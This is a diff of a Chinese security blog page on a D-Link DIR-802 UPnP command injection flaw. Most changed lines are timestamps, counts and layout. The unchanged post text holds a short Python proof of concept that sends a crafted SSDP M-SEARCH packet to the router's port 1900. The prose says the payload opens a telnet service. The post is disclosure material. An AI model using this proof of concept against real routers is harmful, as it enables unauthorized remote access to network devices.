@@ -89,7 +89,7 @@
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://res.cloudinary.com/dozyfkbg3/image/upload/v1614665628/cve/carbon.png">
 <meta property="og:image" content="https://res.cloudinary.com/dozyfkbg3/image/upload/v1614665899/cve/carbon_1.png">
-<meta property="og:updated_time" content="2021-03-02T06:27:53.309Z">
+<meta property="og:updated_time" content="2021-04-10T10:51:34.640Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="DIR-802 OS Command Injection">
 <meta name="twitter:description" content="D-LINK DIR-802 命令注入漏洞 by Cool  漏洞已提交厂商https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10206 漏洞类型CWE-78: Improper Neutralization of Special Elements used in an OS Command">
@@ -378,7 +378,7 @@
                 </span>
                 
                 <span title="字数统计">
-                  372 字
+                  373 字
                 </span>
               
 
@@ -422,7 +422,8 @@
 <h4 id="漏洞概要"><a href="#漏洞概要" class="headerlink" title="漏洞概要"></a>漏洞概要</h4><p>DIR-802中存在一个命令注入漏洞，攻击者可以通过精心制作的M-SEARCH数据包向UPnP注入任意命令。</p>
 <h4 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h4><p>与CVE-2020-15893相似，在固件版本v-1.00b05之前的D-Link DIR-802 A1上发现了一个问题。默认情况下，端口1900上启用了通用即插即用（UPnP）。攻击者可以通过将有效负载注入SSDP M-SEARCH发现数据包的“搜索目标”（ST）字段来执行命令注入。</p>
 <h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">buf = <span class="string">'M-SEARCH * HTTP/1.1\r\nHOST:192.168.0.1:1900\r\nST:urn:schemas-upnp-org:service</span></span><br><span class="line"><span class="string">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span></span><br><span class="line"><span class="string">s.connect(("192.168.0.1", 1900))</span></span><br><span class="line"><span class="string">s.send(buf)</span></span><br><span class="line"><span class="string">s.close()</span></span><br></pre></td></tr></table></figure>
-<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>使用firmadyne进行固件模拟，运行UPnP服务<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1614665628/cve/carbon.png" alt><br>攻击者可以是连接到路由器局域网内并且能够向UPnP端口发送请求的任何人。可以通过编写简单的python脚本将精心制作的数据包发送到特定的upnp端口，该脚本随后将作为精心制作的请求的一部分执行提供的命令。共享的POC将打开端口8089上的telnet服务。<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1614665899/cve/carbon_1.png" alt></p>
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>使用firmadyne进行固件模拟，运行UPnP服务<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1614665628/cve/carbon.png" width="50%" height="50%"></p>
+<p>攻击者可以是连接到路由器局域网内并且能够向UPnP端口发送请求的任何人。可以通过编写简单的python脚本将精心制作的数据包发送到特定的upnp端口，该脚本随后将作为精心制作的请求的一部分执行提供的命令。共享的POC将打开端口8089上的telnet服务。<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1614665899/cve/carbon_1.png" width="50%" height="50%"></p>
 
       
     </div>
@@ -495,6 +496,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/04/10/vm-escape1/" rel="prev" title="VM escape-QEMU Case Study">
+                VM escape-QEMU Case Study <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -580,7 +585,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">29</span>
+                  <span class="site-state-item-count">30</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -602,7 +607,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">53</span>
+                  <span class="site-state-item-count">55</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -694,7 +699,7 @@
       <i class="fa fa-area-chart"></i>
     </span>
     
-    <span title="Site words total count">100.6k</span>
+    <span title="Site words total count">105.4k</span>
   
 </div>
 
